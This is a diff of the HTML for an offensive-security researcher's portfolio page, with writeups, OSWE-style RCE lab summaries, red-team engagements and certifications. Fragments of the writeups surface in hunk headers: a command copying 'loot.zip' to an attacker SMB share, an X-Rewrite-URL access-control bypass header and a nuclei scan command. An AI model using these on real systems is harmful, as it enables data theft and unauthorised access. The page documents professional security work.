+      <span>Offshore</span><span>RastaLabs</span><span>Hades</span>
+      <span>CNSP</span><span>CAP</span><span>API Security Architect</span><span>ISC2 CC</span><span>CCNA</span>
+    </div>
+  </div>
 
-        <details class="post">
+  <section id="writeups">
+    <div class="wrap">
+      <p class="s-label">Writeups</p>
+      <h2>Research &amp; technique notes</h2>
+      <p class="s-desc">Technique-level breakdowns of the bugs I hunt &mdash; sanitised, client-free, and focused on the pattern you can reuse.</p>
+      <div class="articles">
+
+        <details class="article">
           <summary>
-            <div class="meta"><span class="tag">file-transfer</span><span>red team</span><span class="exp">read &#9662;</span></div>
+            <span class="a-tag">red team</span>
             <h3>File transfer cheat sheet: Linux &harr; Windows, quietly</h3>
-            <p>The unflashy skill that wins engagements &mdash; moving a file onto a box in a limited shell without lighting up EDR.</p>
+            <span class="toggle">expand &darr;</span>
           </summary>
           <div class="art">
             <p>Some of the most important offensive skills aren't flashy. Transferring a file without alerting endpoint defences, or getting one exploit onto a box in a stripped-down shell, is where the quiet skills shine. This is the full reference &mdash; every method worth muscle memory, with notes on detection and when each one fits.</p>
@@ -463,11 +398,11 @@ copy C:\loot.zip \\10.10.14.1\share\loot.zip</code></pre>
           </div>
         </details>
 
-        <details class="post">
+        <details class="article">
           <summary>
-            <div class="meta"><span class="tag">access-control</span><span>IDOR</span><span class="exp">read &#9662;</span></div>
+            <span class="a-tag">access control</span>
             <h3>IDOR is more than 9 &rarr; 10: a 403/404 bypass checklist</h3>
-            <p>Changing an ID is the warm-up. Authorization bugs fail quietly, so when the swap returns 403/404, these are the bypasses to reach for.</p>
+            <span class="toggle">expand &darr;</span>
           </summary>
           <div class="art">
             <p>If your IDOR testing stops at changing an ID from 9 to 10, you're scratching the surface. Say you're user <code>10</code>, <code>/api/v2/users/10</code> works, but <code>/api/v2/users/9</code> returns <strong>403</strong> or <strong>404</strong>. That refusal is often shallow. Work this checklist against the blocked request.</p>
@@ -514,11 +449,11 @@ X-Rewrite-URL: /api/v2/users/9</code></pre>
           </div>
         </details>
 
-        <details class="post">
+        <details class="article">
           <summary>
-            <div class="meta"><span class="tag">recon</span><span>AppSec</span><span class="exp">read &#9662;</span></div>
+            <span class="a-tag">recon</span>
             <h3>JavaScript analysis for AppSec: a repeatable workflow</h3>
-            <p>Where to start when a target hands you a wall of JavaScript &mdash; collect, dedupe, filter live, then hunt secrets and endpoints.</p>
+            <span class="toggle">expand &darr;</span>
           </summary>
           <div class="art">
             <p>Client-side JavaScript leaks more than people think: forgotten endpoints, deprecated routes, feature flags, and the occasional hard-coded key. This is a pipeline you can run on any target.</p>
@@ -568,85 +503,107 @@ nuclei -l live-js.txt -t http/exposures/ -o nuclei-js.txt</code></pre>
         </details>
 
       </div>
-      <p class="note">Updated from my field notes &middot; more writeups on the way.</p>
     </div>
   </section>
 
-  <section id="labs" class="reveal">
+  <section id="labs">
     <div class="wrap">
-      <p class="eyebrow"><span class="p">cyb3r@sec:~$</span> git clone cyb3radull4m-labs</p>
-      <h2>Labs</h2>
-      <p class="lead">Free, source-included web exploitation labs for OSWE-style prep. Read the code, find the chain, write the exploit &mdash; every lab ends in remote code execution. One-command Docker, a reference exploit and a walkthrough in each.</p>
-      <div class="pillars">
-        <div class="pillar"><div class="n">01 &middot; PHP &middot; &#9733;&#9734;&#9734;&#9734;&#9734;</div><h3>Looking Glass</h3><p>Type-juggling auth bypass &rarr; command injection &rarr; RCE.</p></div>
-        <div class="pillar"><div class="n">02 &middot; PHP &middot; &#9733;&#9733;&#9733;&#9734;&#9734;</div><h3>Estate Sale</h3><p>Object injection &rarr; POP gadget &rarr; webshell &rarr; RCE.</p></div>
-        <div class="pillar"><div class="n">03 &middot; Node &middot; &#9733;&#9733;&#9734;&#9734;&#9734;</div><h3>Render Farm</h3><p>Access-control bypass &rarr; EJS template injection &rarr; RCE.</p></div>
-        <div class="pillar"><div class="n">04 &middot; Flask &middot; &#9733;&#9733;&#9733;&#9733;&#9734;</div><h3>Ledger</h3><p>Blind SQL injection &rarr; secret exfil &rarr; pickle deserialization &rarr; RCE.</p></div>
-        <div class="pillar"><div class="n">05 &middot; Node &middot; &#9733;&#9733;&#9733;&#9733;&#9733;</div><h3>Polyfill</h3><p>Prototype pollution &rarr; command gadget &rarr; RCE (capstone).</p></div>
-        <div class="pillar" style="display:flex;flex-direction:column;justify-content:center"><div class="n">+ guide</div><h3>How I passed OSWE</h3><p>The prep guide and roadmap that ships with the track.</p></div>
+      <p class="s-label">Labs</p>
+      <h2>OSWE-style exploitation labs</h2>
+      <p class="s-desc">Free, source-included web exploitation labs. Read the code, find the chain, write the exploit &mdash; every lab ends in remote code execution. One-command Docker, a reference exploit and a walkthrough in each.</p>
+      <div class="labs-grid">
+        <div class="lab">
+          <div class="lab-num">01 &middot; <span class="lab-lang">PHP</span><span class="lab-diff"><i class="on"></i><i></i><i></i><i></i><i></i></span></div>
+          <h3>Looking Glass</h3>
+          <p>Type-juggling auth bypass &rarr; command injection &rarr; RCE.</p>
+        </div>
+        <div class="lab">
+          <div class="lab-num">02 &middot; <span class="lab-lang">PHP</span><span class="lab-diff"><i class="on"></i><i class="on"></i><i class="on"></i><i></i><i></i></span></div>
+          <h3>Estate Sale</h3>
+          <p>Object injection &rarr; POP gadget &rarr; webshell &rarr; RCE.</p>
+        </div>
+        <div class="lab">
+          <div class="lab-num">03 &middot; <span class="lab-lang">Node</span><span class="lab-diff"><i class="on"></i><i class="on"></i><i></i><i></i><i></i></span></div>
+          <h3>Render Farm</h3>
+          <p>Access-control bypass &rarr; EJS template injection &rarr; RCE.</p>
+        </div>
+        <div class="lab">
+          <div class="lab-num">04 &middot; <span class="lab-lang">Flask</span><span class="lab-diff"><i class="on"></i><i class="on"></i><i class="on"></i><i class="on"></i><i></i></span></div>
+          <h3>Ledger</h3>
+          <p>Blind SQL injection &rarr; secret exfil &rarr; pickle deserialization &rarr; RCE.</p>
+        </div>
+        <div class="lab">
+          <div class="lab-num">05 &middot; <span class="lab-lang">Node</span><span class="lab-diff"><i class="on"></i><i class="on"></i><i class="on"></i><i class="on"></i><i class="on"></i></span></div>
+          <h3>Polyfill</h3>
+          <p>Prototype pollution &rarr; command gadget &rarr; RCE (capstone).</p>
+        </div>
+        <div class="lab">
+          <div class="lab-num">+ guide</div>
+          <h3>How I passed OSWE</h3>
+          <p>The prep guide and roadmap that ships with the track.</p>
+        </div>
       </div>
-      <p class="note">Open-source &middot; MIT &middot; <a href="https://github.com/cyb3radull4m/cyb3radull4m-labs">github.com/cyb3radull4m/cyb3radull4m-labs</a></p>
+      <p style="font-family:var(--f-mono);font-size:12px;color:var(--muted);margin-top:18px">Open-source &middot; MIT &middot; <a href="https://github.com/cyb3radull4m/cyb3radull4m-labs">github.com/cyb3radull4m/cyb3radull4m-labs</a></p>
     </div>
   </section>
 
-  <section id="focus" class="reveal">
+  <section id="focus">
     <div class="wrap">
-      <p class="eyebrow"><span class="p">cyb3r@sec:~$</span> ./focus --list</p>
+      <p class="s-label">Focus</p>
       <h2>What I work on</h2>
-      <p class="lead">Six lanes I publish and operate in, from deep application logic up to full adversary emulation.</p>
-      <div class="pillars">
-        <div class="pillar"><div class="n">01</div><h3>Red team &amp; adversary emulation</h3><p>Full-scope operations simulating nation-state tradecraft: covert initial access, Active Directory attack chains, privilege escalation and lateral movement across enterprise environments.</p></div>
-        <div class="pillar"><div class="n">02</div><h3>Malware dev &amp; EDR evasion</h3><p>Custom offensive tooling in C and C#. Developing malware and evasion wrappers purpose-built to bypass Endpoint Detection and Response systems during live red team engagements.</p></div>
-        <div class="pillar"><div class="n">03</div><h3>C2 infrastructure &amp; post-exploitation</h3><p>Building and managing Command-and-Control infrastructure at scale. Persistent access, data exfiltration and covert communications across hardened networks.</p></div>
-        <div class="pillar"><div class="n">04</div><h3>Application security &amp; bug bounty</h3><p>Deep business-logic flaws in financial transaction flows, identity management systems, APIs and mobile applications. The bugs automated scanners never see.</p></div>
-        <div class="pillar"><div class="n">05</div><h3>Social engineering</h3><p>Advanced targeted phishing campaigns and physical social engineering exercises against organisations across the African continent.</p></div>
-        <div class="pillar"><div class="n">06</div><h3>Critical infrastructure &amp; Africa</h3><p>Senior offensive-security perspective on the energy, financial services, government and telecom sectors across Africa. Board-level risk translation for C-suite executives.</p></div>
+      <p class="s-desc">Six lanes I publish and operate in, from deep application logic up to full adversary emulation.</p>
+      <div class="focus-grid">
+        <div class="focus-item"><div class="focus-num">01</div><h3>Red team &amp; adversary emulation</h3><p>Full-scope operations simulating nation-state tradecraft: covert initial access, Active Directory attack chains, privilege escalation and lateral movement across enterprise environments.</p></div>
+        <div class="focus-item"><div class="focus-num">02</div><h3>Malware dev &amp; EDR evasion</h3><p>Custom offensive tooling in C and C#. Developing malware and evasion wrappers purpose-built to bypass Endpoint Detection and Response systems during live red team engagements.</p></div>
+        <div class="focus-item"><div class="focus-num">03</div><h3>C2 infrastructure &amp; post-exploitation</h3><p>Building and managing Command-and-Control infrastructure at scale. Persistent access, data exfiltration and covert communications across hardened networks.</p></div>
+        <div class="focus-item"><div class="focus-num">04</div><h3>Application security &amp; bug bounty</h3><p>Deep business-logic flaws in financial transaction flows, identity management systems, APIs and mobile applications. The bugs automated scanners never see.</p></div>
+        <div class="focus-item"><div class="focus-num">05</div><h3>Social engineering</h3><p>Advanced targeted phishing campaigns and physical social engineering exercises against organisations across the African continent.</p></div>
+        <div class="focus-item"><div class="focus-num">06</div><h3>Critical infrastructure &amp; Africa</h3><p>Senior offensive-security perspective on the energy, financial services, government and telecom sectors across Africa. Board-level risk translation for C-suite executives.</p></div>
       </div>
     </div>
   </section>
 
-  <section id="work" class="reveal">
+  <section id="work">
     <div class="wrap">
-      <p class="eyebrow"><span class="p">cyb3r@sec:~$</span> cat engagements.log</p>
-      <h2>Engagements</h2>
-      <p class="lead">Anonymised to respect every NDA. Sectors and outcomes only &mdash; never clients.</p>
-      <div class="work">
-        <div class="op"><div class="sector">Financial</div><div class="d"><h3>National interbank settlement system</h3><p>Full-scope red team against the country's core payment rails. Custom tooling, AD compromise, C2 infrastructure deployment. Findings translated into a board-level risk roadmap for banking executives.</p></div></div>
-        <div class="op"><div class="sector">Oil &amp; gas</div><div class="d"><h3>Upstream energy major</h3><p>Advanced persistent threat adversary emulation across network, Active Directory and cloud environments. Custom C/C# malware development and EDR evasion to accurately replicate nation-state capabilities.</p></div></div>
-        <div class="op"><div class="sector">Government</div><div class="d"><h3>State government infrastructure</h3><p>Offensive assessment of citizen-facing and internal infrastructure. Incident simulation with guided walkthrough for the internal response team.</p></div></div>
-        <div class="op"><div class="sector">Government</div><div class="d"><h3>National data-protection commission</h3><p>Red team engagement against the regulatory body responsible for national data protection. Assessment of the infrastructure protecting citizen data at scale.</p></div></div>
-        <div class="op"><div class="sector">Healthcare</div><div class="d"><h3>Global healthcare leader &mdash; private bug bounty</h3><p>Deep business-logic findings on one of the world's largest healthcare organisations' private program on YesWeHack. Consistently delivering high-quality vulnerability assessments.</p></div></div>
-        <div class="op"><div class="sector">Multi-sector</div><div class="d"><h3>Strategic advisory &amp; executive training</h3><p>Cybersecurity awareness training and strategic risk mitigation advice to top-tier banking and government executives across Africa. Translating complex offensive findings into board-level risk language.</p></div></div>
-        <div class="op"><div class="sector">Multi-sector</div><div class="d"><h3>Social engineering campaigns</h3><p>Advanced targeted phishing and physical social engineering exercises for organisations across multiple African countries. Testing the human layer of defence.</p></div></div>
+      <p class="s-label">Engagements</p>
+      <h2>Selected work</h2>
+      <p class="s-desc">Anonymised to respect every NDA. Sectors and outcomes only &mdash; never clients.</p>
+      <div class="eng-list">
+        <div class="eng"><div class="eng-sector">Financial</div><div class="eng-body"><h3>National interbank settlement system</h3><p>Full-scope red team against the country's core payment rails. Custom tooling, AD compromise, C2 infrastructure deployment. Findings translated into a board-level risk roadmap for banking executives.</p></div></div>
+        <div class="eng"><div class="eng-sector">Oil &amp; gas</div><div class="eng-body"><h3>Upstream energy major</h3><p>Advanced persistent threat adversary emulation across network, Active Directory and cloud environments. Custom C/C# malware development and EDR evasion to accurately replicate nation-state capabilities.</p></div></div>
+        <div class="eng"><div class="eng-sector">Government</div><div class="eng-body"><h3>State government infrastructure</h3><p>Offensive assessment of citizen-facing and internal infrastructure. Incident simulation with guided walkthrough for the internal response team.</p></div></div>
+        <div class="eng"><div class="eng-sector">Government</div><div class="eng-body"><h3>National data-protection commission</h3><p>Red team engagement against the regulatory body responsible for national data protection. Assessment of the infrastructure protecting citizen data at scale.</p></div></div>
+        <div class="eng"><div class="eng-sector">Healthcare</div><div class="eng-body"><h3>Global healthcare leader &mdash; private bug bounty</h3><p>Deep business-logic findings on one of the world's largest healthcare organisations' private program on YesWeHack. Consistently delivering high-quality vulnerability assessments.</p></div></div>
+        <div class="eng"><div class="eng-sector">Multi-sector</div><div class="eng-body"><h3>Strategic advisory &amp; executive training</h3><p>Cybersecurity awareness training and strategic risk mitigation advice to top-tier banking and government executives across Africa. Translating complex offensive findings into board-level risk language.</p></div></div>
+        <div class="eng"><div class="eng-sector">Multi-sector</div><div class="eng-body"><h3>Social engineering campaigns</h3><p>Advanced targeted phishing and physical social engineering exercises for organisations across multiple African countries. Testing the human layer of defence.</p></div></div>
       </div>
     </div>
   </section>
 
-  <section id="creds" class="reveal">
+  <section id="creds">
     <div class="wrap">
-      <p class="eyebrow"><span class="p">cyb3r@sec:~$</span> sudo loadout --all</p>
-      <h2>Credentials</h2>
-      <p class="lead">Elite offensive certifications and nation-state-grade lab clears.</p>
-      <div class="credgrid">
-        <div>
+      <p class="s-label">Credentials</p>
+      <h2>Certifications &amp; recognition</h2>
+      <div class="cred-cols" style="margin-top:28px">
+        <div class="cred-group">
           <h3>Certifications</h3>
-          <ul class="taglist">
+          <ul class="tags">
             <li class="key">OSWE</li><li class="key">OSEP</li><li class="key">OSCP</li>
             <li>Maldev Academy</li><li>LPT</li><li>CHFI</li><li>CEH</li>
             <li>CAP</li><li>CNSP</li><li>QCS</li><li>CCNA</li><li>ISC2 CC</li><li>API Security Architect</li>
           </ul>
         </div>
-        <div>
+        <div class="cred-group">
           <h3>HTB Pro Labs</h3>
-          <ul class="taglist">
+          <ul class="tags">
             <li class="key">APTLabs</li><li class="key">Cybernetics</li><li>Dante</li><li>Zephyr</li>
             <li>Offshore</li><li>RastaLabs</li><li>Poo</li><li>Xen</li><li>Hades</li>
           </ul>
         </div>
       </div>
-      <div style="margin-top:24px">
-        <h3 style="font-family:var(--f-mono);font-size:12.5px;letter-spacing:.1em;text-transform:uppercase;color:var(--muted);margin:0 0 12px;font-weight:600">Recognition</h3>
-        <ul class="taglist">
+      <div class="cred-group" style="margin-top:28px">
+        <h3>Recognition</h3>
+        <ul class="tags">
           <li class="key">EC-Council Hall of Fame</li>
           <li class="key">Outstanding Young CyberSec Professional &mdash; Finalist</li>
           <li>Lead Innovator of the Year 2025</li>
@@ -658,38 +615,37 @@ nuclei -l live-js.txt -t http/exposures/ -o nuclei-js.txt</code></pre>
     </div>
   </section>
 
-  <section id="contact" class="reveal">
+  <section id="contact">
     <div class="wrap">
-      <p class="eyebrow"><span class="p">cyb3r@sec:~$</span> ./connect</p>
+      <p class="s-label">Contact</p>
       <h2>Get in touch</h2>
-      <p class="lead">Research collaboration, disclosure coordination, or a private program worth a look.</p>
-      <div class="contact-row">
-        <div class="cline"><span class="k">x</span><span class="v" id="c-x">@cyb3radull4m</span><button class="copy" data-copy="@cyb3radull4m" type="button">copy</button></div>
-        <div class="cline"><span class="k">github</span><span class="v" id="c-gh">cyb3radull4m</span><button class="copy" data-copy="github.com/cyb3radull4m" type="button">copy</button></div>
-        <div class="cline"><span class="k">mail</span><span class="v" id="c-mail">hey@cyb3radull4m.com</span><button class="copy" data-copy="hey@cyb3radull4m.com" type="button">copy</button></div>
-        <div class="cline"><span class="k">in</span><a class="v" href="https://www.linkedin.com/in/ewaoluwa-adeniji" target="_blank" rel="noopener">linkedin.com/in/ewaoluwa-adeniji</a></div>
+      <p class="s-desc">Research collaboration, disclosure coordination, or a private program worth a look.</p>
+      <div class="contact-links">
+        <div class="c-link"><span class="label">X</span><span class="val">@cyb3radull4m</span><button class="c-copy" data-copy="@cyb3radull4m" type="button">copy</button></div>
+        <div class="c-link"><span class="label">GitHub</span><span class="val">cyb3radull4m</span><button class="c-copy" data-copy="github.com/cyb3radull4m" type="button">copy</button></div>
+        <div class="c-link"><span class="label">Email</span><span class="val">hey@cyb3radull4m.com</span><button class="c-copy" data-copy="hey@cyb3radull4m.com" type="button">copy</button></div>
+        <a class="c-link" href="https://www.linkedin.com/in/ewaoluwa-adeniji" target="_blank" rel="noopener"><span class="label">LinkedIn</span><span class="val">ewaoluwa-adeniji</span></a>
       </div>
-      <p class="note">PGP key published here once the domain is live &middot; handles shown are placeholders to confirm before launch.</p>
     </div>
   </section>
 </main>
 
 <footer>
   <div class="wrap">
-    <span>cyb3radull4m &mdash; offensive security</span>
-    <span>built to be found</span>
+    <span>&copy; 2026 cyb3radull4m</span>
+    <div class="foot-links">
+      <a href="https://github.com/cyb3radull4m" target="_blank" rel="noopener">GitHub</a>
+      <a href="https://x.com/cyb3radull4m" target="_blank" rel="noopener">X</a>
+      <a href="https://www.linkedin.com/in/ewaoluwa-adeniji" target="_blank" rel="noopener">LinkedIn</a>
+    </div>
   </div>
 </footer>
 
 <script>
 (function(){
-  var reduce = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
-  var root=document.documentElement;
-  root.classList.add('has-js');
-
-  /* details polyfill for browsers without native support */
+  /* details polyfill */
   if(!('open' in document.createElement('details'))){
-    [].slice.call(document.querySelectorAll('details.post')).forEach(function(d){
+    [].slice.call(document.querySelectorAll('details.article')).forEach(function(d){
       var sum=d.querySelector('summary');
       if(!sum) return;
       var art=d.querySelector('.art');
@@ -708,14 +664,12 @@ nuclei -l live-js.txt -t http/exposures/ -o nuclei-js.txt</code></pre>
   }
 
   /* copy buttons */
-  document.querySelectorAll('.copy').forEach(function(b){
+  document.querySelectorAll('.c-copy').forEach(function(b){
     b.addEventListener('click',function(){
       var t=b.getAttribute('data-copy');
-      function done(){ var o=b.textContent; b.textContent='ok'; b.classList.add('ok');
+      function done(){ var o=b.textContent; b.textContent='copied'; b.classList.add('ok');
         setTimeout(function(){ b.textContent=o; b.classList.remove('ok'); },1100); }
-      function sel(){ try{ var r=document.createRange(), el=b.previousElementSibling;
-        r.selectNodeContents(el); var s=window.getSelection(); s.removeAllRanges(); s.addRange(r); done(); }catch(e){} }
-      if(navigator.clipboard&&navigator.clipboard.writeText){ navigator.clipboard.writeText(t).then(done).catch(sel); } else { sel(); }
+      if(navigator.clipboard&&navigator.clipboard.writeText){ navigator.clipboard.writeText(t).then(done).catch(function(){}); }
     });
   });
 
@@ -732,70 +686,20 @@ nuclei -l live-js.txt -t http/exposures/ -o nuclei-js.txt</code></pre>
     pre.appendChild(b);
   });
 
-  /* matrix rain */
-  var cv=document.getElementById('matrix');
-  if(cv && cv.getContext){
-    var ctx=cv.getContext('2d'), fs=14, cols=0, drops=[],
-        chars="01<>/\\{}[]#$%&=+*ｱｶｷｹｺﾐﾇﾑﾎｻﾘﾂﾃﾅ0123456789ABCDEF".split("");
-    function mcol(){ return (getComputedStyle(root).getPropertyValue('--matrix')||'#2fd79a').trim(); }
-    function size(){ cv.width=cv.clientWidth; cv.height=cv.clientHeight;
-      cols=Math.ceil(cv.width/fs); drops=[]; for(var i=0;i<cols;i++) drops[i]=Math.random()*-30; }
-    function draw(){ ctx.fillStyle='rgba(10,12,17,0.085)'; ctx.fillRect(0,0,cv.width,cv.height);
-      ctx.fillStyle=mcol(); ctx.font=fs+'px monospace';
-      for(var i=0;i<cols;i++){ var t=chars[(Math.random()*chars.length)|0];
-        ctx.fillText(t,i*fs,drops[i]*fs);
-        if(drops[i]*fs>cv.height && Math.random()>0.975) drops[i]=0; drops[i]++; } }
-    size(); window.addEventListener('resize', size);
-    if(!reduce){ setInterval(draw, 55); } else { draw(); draw(); }
-  }
-
-  /* cursor glow */
-  var cg=document.getElementById('cursor-glow');
-  if(cg && !reduce && !('ontouchstart' in window)){
-    document.addEventListener('mousemove',function(e){
-      cg.style.left=e.clientX+'px';
-      cg.style.top=e.clientY+'px';
-    });
-  }
-
-  /* scroll-reveal sections */
-  var revs=[].slice.call(document.querySelectorAll('.reveal'));
-  if(reduce || !('IntersectionObserver' in window)){ revs.forEach(function(s){ s.classList.add('in'); }); }
-  else {
-    var io=new IntersectionObserver(function(es){ es.forEach(function(e){
-      if(e.isIntersecting){ e.target.classList.add('in'); io.unobserve(e.target); } }); },
-      {rootMargin:'0px 0px -12% 0px',threshold:.08});
-    revs.forEach(function(s){ io.observe(s); });
-  }
-
-  /* active nav link via section in view */
+  /* active nav link */
   var navlinks={}, sids=['writeups','labs','focus','work','creds','contact'];
-  document.querySelectorAll('.bar nav a').forEach(function(a){ navlinks[a.getAttribute('href').slice(1)]=a; });
+  document.querySelectorAll('header nav a').forEach(function(a){
+    var h=a.getAttribute('href'); if(h&&h.charAt(0)==='#') navlinks[h.slice(1)]=a;
+  });
   if('IntersectionObserver' in window){
     var cur=null;
     var so=new IntersectionObserver(function(es){ es.forEach(function(e){
       if(e.isIntersecting){ var id=e.target.id;
-        if(cur&&navlinks[cur]) navlinks[cur].classList.remove('active');
-        if(navlinks[id]){ navlinks[id].classList.add('active'); cur=id; } } }); },
-      {rootMargin:'-45% 0px -50% 0px',threshold:0});
+        if(cur&&navlinks[cur]) navlinks[cur].style.color='';
+        if(navlinks[id]){ navlinks[id].style.color='var(--fg)'; cur=id; } } }); },
+      {rootMargin:'-40% 0px -55% 0px',threshold:0});
     sids.forEach(function(id){ var el=document.getElementById(id); if(el) so.observe(el); });
   }
-
-  /* typed terminal boot */
-  var lines=[].slice.call(document.querySelectorAll('#term .tline'));
-  lines.forEach(function(l){ l.dataset.text=l.textContent; });
-  if(reduce){ return; }
-  lines.forEach(function(l){ l.textContent=''; });
-  var li=0;
-  (function typeLine(){
-    if(li>=lines.length){ return; }
-    var el=lines[li], txt=el.dataset.text, ci=0; el.classList.add('active');
-    (function ch(){
-      if(ci<=txt.length){ el.textContent=txt.slice(0,ci); ci++;
-        setTimeout(ch, el.classList.contains('cmd') ? (40+Math.random()*40) : (14+Math.random()*22)); }
-      else { el.classList.remove('active'); li++; setTimeout(typeLine, el.classList.contains('cmd')?220:120); }
-    })();
-  })();
 })();
 </script>
 </html>
